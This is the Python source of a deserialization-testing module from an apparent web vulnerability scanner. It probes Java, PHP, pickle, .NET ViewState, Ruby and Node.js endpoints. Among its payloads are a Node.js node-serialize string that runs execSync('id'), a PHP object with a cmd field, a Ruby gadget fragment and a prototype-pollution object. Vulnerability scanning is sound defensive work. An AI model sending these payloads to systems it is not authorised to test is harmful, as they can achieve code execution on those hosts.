#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK - Deserialization Module
Java, PHP, Python, .NET deserialization vulnerability detection
"""

import re
import base64

from config import Colors


class DeserializationModule:
    """Deserialization Vulnerability Testing Module"""
    
    def __init__(self, engine):
        self.engine = engine
        self.requester = engine.requester
        self.name = "Deserialization"
        
        # Deserialization indicators
        self.deser_indicators = {
            'java': [
                'java.io.objectinputstream',
                'classnotfoundexception',
                'java.io.invalidclassexception',
                'java.io.streamcorruptedexception',
                'objectinputstream',
                'aced0005',  # Java serialization magic bytes
            ],
            'php': [
                'unserialize()',
                '__wakeup',
                '__destruct',
                'o:4:',  # PHP object serialization
                'a:2:{',  # PHP array serialization
            ],
            'python': [
                'unpickle',
                'pickle.loads',
                'cpickle',
                '_reconstructor',
                'builtins',
            ],
            'dotnet': [
                'system.runtime.serialization',
                'binaryformatter',
                'objectstateformatter',
                '__viewstate',
                'typenamemismatch',
            ],
        }
    
    def test(self, url, method, param, value):
        """Test for deserialization vulnerabilities"""
        self._test_java_deser(url, method, param, value)
        self._test_php_deser(url, method, param, value)
        self._test_python_pickle(url, method, param, value)
        self._test_dotnet_viewstate(url, method, param, value)
        self._test_ruby_deser(url, method, param, value)
        self._test_node_deser(url, method, param, value)
    
    def test_url(self, url):
        """Test URL for deserialization indicators"""
        self._test_response_indicators(url)
    
    def _test_java_deser(self, url, method, param, value):
        """Test for Java deserialization vulnerabilities"""
        # Java serialization magic bytes (aced0005) in various encodings
        java_payloads = [
            base64.b64encode(bytes.fromhex('aced0005')).decode(),
            'rO0ABXNyABFqYXZhLmxhbmcuQm9vbGVhbtWL5JgSEOcoAgABWgAFdmFsdWV4cAE=',
            'aced00057372001',
        ]
        for payload in java_payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                if not response:
                    continue
                response_text = response.text.lower()
                for indicator in self.deser_indicators['java']:
                    if indicator.lower() in response_text:
                        from core.engine import Finding
                        finding = Finding(
                            technique="Deserialization (Java)",
                            url=url, severity='CRITICAL', confidence=0.85,
                            param=param, payload=payload[:50],
                            evidence=f"Java deserialization indicator: {indicator}",
                        )
                        self.engine.add_finding(finding)
                        return
            except Exception:
                continue
    
    def _test_php_deser(self, url, method, param, value):
        """Test for PHP deserialization vulnerabilities"""
        php_payloads = [
            'O:8:"stdClass":0:{}',
            'O:4:"Test":1:{s:4:"test";s:4:"test";}',
            'a:1:{s:4:"test";s:4:"test";}',
            'O:7:"Example":1:{s:3:"cmd";s:2:"id";}',
        ]
        for payload in php_payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                if not response:
                    continue
                response_text = response.text.lower()
                for indicator in self.deser_indicators['php']:
                    if indicator.lower() in response_text:
                        from core.engine import Finding
                        finding = Finding(
                            technique="Deserialization (PHP Object Injection)",
                            url=url, severity='HIGH', confidence=0.8,
                            param=param, payload=payload,
                            evidence=f"PHP deserialization indicator: {indicator}",
                        )
                        self.engine.add_finding(finding)
                        return
            except Exception:
                continue
    
    def _test_python_pickle(self, url, method, param, value):
        """Test for Python pickle injection"""
        # Safe pickle payloads that test for deserialization behavior
        pickle_payloads = [
            base64.b64encode(b'\\x80\\x04\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00.').decode(),
            'gASVCAAAAAAAAACMBHRlc3SULg==',
        ]
        for payload in pickle_payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                if not response:
                    continue
                response_text = response.text.lower()
                for indicator in self.deser_indicators['python']:
                    if indicator.lower() in response_text:
                        from core.engine import Finding
                        finding = Finding(
                            technique="Deserialization (Python Pickle)",
                            url=url, severity='CRITICAL', confidence=0.85,
                            param=param, payload=payload[:50],
                            evidence=f"Python pickle indicator: {indicator}",
                        )
                        self.engine.add_finding(finding)
                        return
            except Exception:
                continue
    
    def _test_dotnet_viewstate(self, url, method, param, value):
        """Test for .NET ViewState deserialization"""
        viewstate_payloads = [
            '/wEPDwULLTE2MTY2ODcyMjkPFgIeCFVzZXJOYW1lBQV0ZXN0ZGFD',
            '__VIEWSTATE=/wEPDwULLTE2MTY2ODcyMjkPFgIeCFVzZXJOYW1lBQV0ZXN0ZGFD',
        ]
        for payload in viewstate_payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                if not response:
                    continue
                response_text = response.text.lower()
                for indicator in self.deser_indicators['dotnet']:
                    if indicator.lower() in response_text:
                        from core.engine import Finding
                        finding = Finding(
                            technique="Deserialization (.NET ViewState)",
                            url=url, severity='HIGH', confidence=0.75,
                            param=param, payload=payload[:50],
                            evidence=f".NET deserialization indicator: {indicator}",
                        )
                        self.engine.add_finding(finding)
                        return
            except Exception:
                continue
    
    def _test_ruby_deser(self, url, method, param, value):
        """Test for Ruby deserialization vulnerabilities"""
        ruby_payloads = [
            '\x04\x08o:\x15Gem::Requirement\x06:\x10@requirements',
            'BAhpBg==',  # Marshal.dump(1) base64
        ]
        ruby_indicators = ['marshal', 'typeerror', 'argumenterror', 'gem::', 'ruby', 'nomethoderror']
        for payload in ruby_payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                if not response:
                    continue
                response_text = response.text.lower()
                for indicator in ruby_indicators:
                    if indicator in response_text:
                        from core.engine import Finding
                        finding = Finding(
                            technique="Deserialization (Ruby Marshal)",
                            url=url, severity='HIGH', confidence=0.8,
                            param=param, payload=payload[:50],
                            evidence=f"Ruby deserialization indicator: {indicator}",
                        )
                        self.engine.add_finding(finding)
                        return
            except Exception:
                continue
    
    def _test_node_deser(self, url, method, param, value):
        """Test for Node.js deserialization vulnerabilities"""
        node_payloads = [
            '{"rce":"_$$ND_FUNC$$_function(){return require(\'child_process\').execSync(\'id\')}()"}',
            '{"__proto__":{"polluted":true}}',
            '_$$ND_FUNC$$_function(){return 1}()',
        ]
        node_indicators = ['node-serialize', 'unserialize', 'child_process', 'rce', '_$$nd_func$$_', 'syntaxerror', 'referenceerror']
        for payload in node_payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                if not response:
                    continue
                response_text = response.text.lower()
                for indicator in node_indicators:
                    if indicator in response_text:
                        from core.engine import Finding
                        finding = Finding(
                            technique="Deserialization (Node.js)",
                            url=url, severity='CRITICAL', confidence=0.85,
                            param=param, payload=payload[:50],
                            evidence=f"Node.js deserialization indicator: {indicator}",
                        )
                        self.engine.add_finding(finding)
                        return
            except Exception:
                continue
    
    def _test_response_indicators(self, url):
        """Check response for deserialization indicators"""
        try:
            response = self.requester.request(url, 'GET')
            if not response:
                return
            response_text = response.text.lower()
            for lang, indicators in self.deser_indicators.items():
                for indicator in indicators:
                    if indicator.lower() in response_text:
                        from core.engine import Finding
                        finding = Finding(
                            technique=f"Deserialization ({lang.title()} Indicator)",
                            url=url, severity='MEDIUM', confidence=0.5,
                            param='N/A', payload='N/A',
                            evidence=f"Deserialization indicator in response: {indicator}",
                        )
                        self.engine.add_finding(finding)
                        return
        except Exception:
            pass
